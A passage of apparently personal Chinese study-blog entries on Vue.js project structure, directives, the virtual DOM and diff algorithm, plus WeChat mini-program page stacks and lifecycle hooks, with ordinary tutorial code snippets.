class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="Vue项目结构"><a href="#Vue项目结构" class="headerlink" title="Vue项目结构"></a>Vue项目结构</h2><p>上次构建好项目后，没仔细看，今天来具体看一下</p><p><img src="https://s1.ax1x.com/2020/04/24/JB0OlF.png" alt="JB0OlF.png"></p><ul><li>index.html：首页入口文件，浏览器中显示的页面</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>vuetest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>main.js：项目的核心文件，主要完成了index.html中vue实例的挂载</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>            <span class="comment">//引入vue组件，才可以进行new Vue</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App'</span>          <span class="comment">//引入App组件</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span>    <span class="comment">//引入路由组件</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* eslint-disable no-new */</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  router,</span><br><span class="line">  components: &#123; App &#125;,            <span class="comment">//id为app的div中有一个名为App的组件</span></span><br><span class="line">  template: <span class="string">'&lt;App/&gt;'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>APP.vue：项目入口文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;./assets/logo.png&quot;&gt;</span><br><span class="line">    &lt;router-view/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;App&apos;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">#app &#123;</span><br><span class="line">  font-family: &apos;Avenir&apos;, Helvetica, Arial, sans-serif;</span><br><span class="line">  -webkit-font-smoothing: antialiased;</span><br><span class="line">  -moz-osx-font-smoothing: grayscale;</span><br><span class="line">  text-align: center;</span><br><span class="line">  color: #2c3e50;</span><br><span class="line">  margin-top: 60px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>现在就明显了，<code>index.html</code>里的div使用<code>main.js</code>中的挂载，去找App.vue这个组件去渲染，那么App.vue里已经有了logo图片 ，那么下面的<code>&lt;router-view/&gt;</code>是什么意思呢？</p><p>我么去找一下<code>src/router/index.js</code>这个文件、</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">'@/components/HelloWorld'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">'/'</span>,</span><br><span class="line">      name: <span class="string">'HelloWorld'</span>,</span><br><span class="line">      component: HelloWorld</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//在index.js的代码中，建立了路由相关的内容，也就会渲染到app.vue下面的&lt;router-view&gt;中。在index.js中，将helloworld组件发布为路由，换句说，index.js在这里就是将helloword发布为路由</span></span><br></pre></td></tr></table></figure><p>helloworld组件就是在图片logo下显示的内容了。</p><p><strong>顺序：index.html-&gt;main.js-&gt;App.vue-&gt;index.js-&gt;HelloWorld.vue</strong></p><h2 id="父子组件的通信"><a href="#父子组件的通信" class="headerlink" title="父子组件的通信"></a>父子组件的通信</h2><p><strong>父组件通过props属性向下传递数据给子组件，子组件通过events事件给父组件发送消息</strong></p><ul><li>子组件需要某个数据，就在内部定义一个<code>prop</code>属性，然后父组件把自己的data属性传递给子组件这个属性。 </li><li>子组件内部发生了什么事情的时候，就通过<strong>自定义事件</strong>来把这个事情涉及到的数据暴露出来，供父组件处理。 </li></ul></script></template></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.23</title>
      <link href="2020/04/23/%E6%97%A5%E5%B8%B8-2020.4.23/"/>
      <url>2020/04/23/%E6%97%A5%E5%B8%B8-2020.4.23/</url>
      
        <content type="html"><![CDATA[<ul><li>虚拟DOM</li><li>小程序的页面栈</li><li>小程序的生命周期</li><li>一次踩坑经历（异步执行顺序）</li></ul><a id="more"></a><h2 id="vue的虚拟DOM"><a href="#vue的虚拟DOM" class="headerlink" title="vue的虚拟DOM"></a>vue的虚拟DOM</h2><p>参考文章：<a href="https://www.jianshu.com/p/af0b398602bc" target="_blank" rel="noopener">vue核心之虚拟DOM(vdom)</a> ,<a href="https://www.cnblogs.com/fundebug/p/vue-virtual-dom.html" target="_blank" rel="noopener">详解Vue中的虚拟DOM </a></p><p><strong>真实DOM和解析流程</strong></p><blockquote><p> 创建DOM树——创建StyleRules——创建Render树——布局Layout——绘制Painting </p></blockquote><p><strong>JS操作真实DOM的代价</strong></p><blockquote><p>原生JS或JQ操作DOM时，浏览器会从构建DOM树开始从头到尾执行一遍流程。如果连续操作了10次DOM，前一次计算可能为无用功。计算DOM节点坐标值等都是白白浪费的性能。</p></blockquote><p><strong>为什么需要虚拟DOM</strong></p><blockquote><p>虚拟DOM就是为了<strong>解决浏览器性能问题</strong>而被设计出来的。<strong>如前</strong>，若一次操作中有10次更新DOM的动作，虚拟DOM不会立即操作DOM，而是将这10次更新的diff内容保存到本地一个JS对象中，最终将这个JS对象一次性attch到DOM树上，再进行后续操作，避免大量无谓的计算量。</p></blockquote><p>也就是说，可以把虚拟DOM理解为一个简单的JS对象，并且最少包含标签名( tag)、属性(attrs)和子元素对象( children)三个属性,就比如像下面这样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vnode = &#123;</span><br><span class="line">  tag:<span class="string">'div'</span>,</span><br><span class="line">  attrs:&#123;<span class="attr">id</span>:<span class="string">'app'</span>&#125;,</span><br><span class="line">  children:[&#123; <span class="attr">tag</span>:<span class="string">'span'</span>,<span class="attr">attrs</span>:&#123;<span class="attr">id</span>:<span class="string">'child'</span>&#125;,<span class="attr">children</span>:[<span class="string">'1'</span>]&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Vue的渲染流程"><a href="#Vue的渲染流程" class="headerlink" title="Vue的渲染流程"></a>Vue的渲染流程</h3><p><img src="https://image.fundebug.com/2019-06-26-01.png" alt="1"></p><ul><li><strong>渲染函数</strong>：渲染函数是用来生成Virtual DOM的。Vue推荐使用模板来构建我们的应用界面，在底层实现中Vue会将模板编译成渲染函数，当然我们也可以不写模板，直接写渲染函数，以获得更好的控制。</li><li><strong>VNode 虚拟节点</strong>：它可以代表一个真实的 dom 节点。通过 createElement 方法能将 VNode 渲染成 dom 节点。简单地说，vnode可以理解成<strong>节点描述对象</strong>，它描述了应该怎样去创建真实的DOM节点。</li><li><p><strong>patch(也叫做patching算法)</strong>：虚拟DOM最核心的部分，它可以将vnode渲染成真实的DOM，这个过程是对比新旧虚拟节点之间有哪些不同，然后根据对比结果找出需要更新的的节点进行更新。</p><p>为了实现高效的DOM操作，一套高效的虚拟DOM diff算法显得很有必要。<strong>我们通过patch 的核心—-diff 算法，找出本次DOM需要更新的节点来更新，其他的不更新</strong>。 </p></li><li><p>patch（补丁）：将虚拟DOM渲染成真实的DOM</p></li><li>diff（差异）：比较新旧虚拟结点之间的不同</li></ul><p><img src="https://image.fundebug.com/2019-06-26-04.png" alt="2"></p><h3 id="diff算法"><a href="#diff算法" class="headerlink" title="diff算法"></a>diff算法</h3><p>原理：两个树完全的diff算法的时间复杂度为O（n^3）,Vue进行了优化，只比较同级不考虑跨级，时间复杂度为O（n），步骤大致如下：</p><ul><li>同级比较，再比较子结点</li><li>先判断一方有子节点，另一方没有的情况，直接更新</li><li>若都有子节点，递归比较</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">diff</span>(<span class="params">vnode, newVnode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> children = vnode.children || []</span><br><span class="line">    <span class="keyword">var</span> newChildren = newVnode.children || []</span><br><span class="line">  <span class="comment">// 遍历现有的children</span></span><br><span class="line">    children.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">childVnode, index</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> newChildVnode = newChildren[index]</span><br><span class="line">  <span class="comment">// 两者tag一样</span></span><br><span class="line">        <span class="keyword">if</span> (childVnode.tag === newChildVnode.tag) &#123;</span><br><span class="line">            <span class="comment">// 深层次对比，递归</span></span><br><span class="line">            diff(childVnode, newChildVnode)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">  <span class="comment">// 两者tag不一样</span></span><br><span class="line">           replaceNode(childVnode, newChildVnode) </span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)&#125;</span><br></pre></td></tr></table></figure><p>然后我去看了一下源码中的diff算法，在<code>src/vdom/patch.js</code>中，说实话emmm，没看懂，等以后学到位了再详细看把，先在这记录一下。</p><h2 id="小程序的页面栈"><a href="#小程序的页面栈" class="headerlink" title="小程序的页面栈"></a>小程序的页面栈</h2><table><thead><tr><th>路由方式</th><th>页面栈</th></tr></thead><tbody><tr><td>初始化</td><td>新页面入栈</td></tr><tr><td>打开新页面（wx.navigateTo）</td><td>新页面入栈</td></tr><tr><td>页面重定向（wx.redirctTo）</td><td>当前页面出栈，新页面入栈</td></tr><tr><td>页面返回（wx.navigateBack）</td><td>页面不断出栈，直到目标返回页，新页面入栈</td></tr><tr><td>Tab切换（wx.switchTab或底部tab切换）</td><td>页面全部出栈，只留下新的Tab页面</td></tr><tr><td>重启动（wx.relaunch）</td><td>页面全部出栈，只留下新的页面</td></tr></tbody></table><ul><li><code>navigateTo</code>, <code>redirectTo</code> 只能打开非 tabBar 页面。</li><li><code>switchTab</code> 只能打开 tabBar 页面。</li><li><code>reLaunch</code> 可以打开任意页面。</li><li>页面底部的 tabBar 由页面决定，即只要是定义为 tabBar 的页面，底部都有 tabBar。</li><li><p>调用页面路由带的参数可以在目标页面的<code>onLoad</code>中获取。</p><h2 id="小程序的生命周期"><a href="#小程序的生命周期" class="headerlink" title="小程序的生命周期"></a>小程序的生命周期</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">onLaunch() &#123;</span><br><span class="line">  console.log(&apos;onLaunch监听小程序初始化&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">onShow() &#123;</span><br><span class="line">  console.log(&apos;onShow监听小程序显示&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">onHide() &#123;</span><br><span class="line">  console.log(&apos;onLaunch监听小程序隐藏&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="页面的生命周期"><a href="#页面的生命周期" class="headerlink" title="页面的生命周期"></a>页面的生命周期</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">onLoad(options) &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'onLoad监听页面加载'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> onReady() &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'onReady监听页面初次渲染完成'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> onShow() &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'onShow监听页面显示'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> onHide() &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'onHide监听页面隐藏'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> onUnload() &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'onUnload监听页面卸载'</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="一次踩坑经历（异步执行顺序）"><a href="#一次踩坑经历（异步执行顺序）" class="headerlink" title="一次踩坑经历（异步执行顺序）"></a>一次踩坑经历（异步执行顺序）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getDataFromDb()&#123;<span class="comment">//从数据库中获取</span></span><br><span class="line">    success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">        setData()<span class="comment">//获取的值设置到页面中</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'1'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn()&#123;</span><br><span class="line">    getDataFromDb()</span><br><span class="line">    getData()<span class="comment">//从页面中取值，发现取不到</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2,1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.22</title>
      <link href="2020/04/22/%E6%97%A5%E5%B8%B8-2020.4.22/"/>
      <url>2020/04/22/%E6%97%A5%E5%B8%B8-2020.4.22/</url>
      
        <content type="html"><![CDATA[<p>今天学习一下vue中常见的一些指令。</p><ul><li>v-text / v-html ，v-for，v-on</li><li>v-if / v-else，v-bind，v-model</li><li>v-show / v-if，v-once，v-cloak</li><li>vue的生命周期与钩子函数</li><li>export与import的使用</li></ul><a id="more"></a><h2 id="v-text-v-html"><a href="#v-text-v-html" class="headerlink" title="v-text / v-html"></a>v-text / v-html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">'text'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>     <span class="comment">&lt;!--结果："&lt;h1&gt;111111111&lt;/h1&gt;"--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">'text'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>     <span class="comment">&lt;!--结果："111111111"--&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'vue.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="xml">               text:"<span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是h1标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>"</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">'item in items'</span>&gt;</span>&#123;&#123; item.msg &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span> <span class="comment">&lt;!--结果：5个li分别显示12345--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">            data:&#123;</span></span><br><span class="line"><span class="undefined">                items:[</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"1"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"2"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"3"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"4"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"5"</span> &#125;</span></span><br><span class="line"><span class="undefined">                ]</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-on：绑定事件"><a href="#v-on：绑定事件" class="headerlink" title="v-on：绑定事件"></a>v-on：绑定事件</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">'add'</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span>  <span class="comment">&lt;!--结果：弹窗你好--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">'add'</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="javascript">               add:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                   alert(<span class="string">'你好'</span>)</span></span><br><span class="line"><span class="undefined">               &#125;</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-if-v-else"><a href="#v-if-v-else" class="headerlink" title="v-if / v-else"></a>v-if / v-else</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">'ifelse'</span>&gt;</span>我是if<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="comment">&lt;!--值为true显示第一行,值为false显示第二行--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span>我是else<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">            data:&#123;</span></span><br><span class="line"><span class="javascript">                ifelse:<span class="literal">false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-bind：绑定属性"><a href="#v-bind：绑定属性" class="headerlink" title="v-bind：绑定属性"></a>v-bind：绑定属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">       <span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="selector-tag">color</span>: <span class="selector-id">#2b84da</span>;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">'bing'</span> <span class="attr">v-bind:class</span>=<span class="string">"&#123;active: isActive&#125;"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">'bing'</span> <span class="attr">:class</span>=<span class="string">"&#123;active: isActive&#125;"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="javascript">               bing: <span 